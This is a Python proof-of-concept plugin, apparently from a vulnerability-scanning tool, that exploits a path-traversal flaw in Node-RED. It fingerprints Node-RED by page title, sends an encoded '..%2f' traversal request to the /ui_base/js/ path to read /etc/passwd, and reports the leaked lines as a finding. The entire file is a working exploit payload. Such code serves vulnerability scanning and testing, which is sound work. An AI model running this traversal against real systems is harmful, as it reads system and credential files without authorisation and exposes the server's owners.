# -*- coding:utf-8 -*-
# Node-RED 任意文件读取

import traceback
from .. import fileUtil
from ServiceScanModel.models import ServiceScan
from ..requestClass import Requests


class POC:
    def __init__(self, service: ServiceScan):
        self.service = service
        self.requestUtil= Requests(service.cookies)
        self.result = False

    def read_file(self, url, filename="%2fetc%2fpasswd"):
        filename = filename.replace("/", "%2f")
        print(filename)
        resp = self.requestUtil.get(url + f"/ui_base/js/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..{filename}")
        return resp.text

    def fingerprint(self):
        try:
            if self.service.title.lower() == "node-red":
                return True
        except:
            return False

    def poc(self):
        try:
            result = self.read_file(self.service.url)
            print(result)
            if "root" in result:
                return ["Node-RED 任意文件读取", "<b>/etc/passwd: </b><br>%s<br>..." % ("<br>".join(result.split("\n")[:2]))]
        except Exception as e:
            traceback.print_exc()
            return []
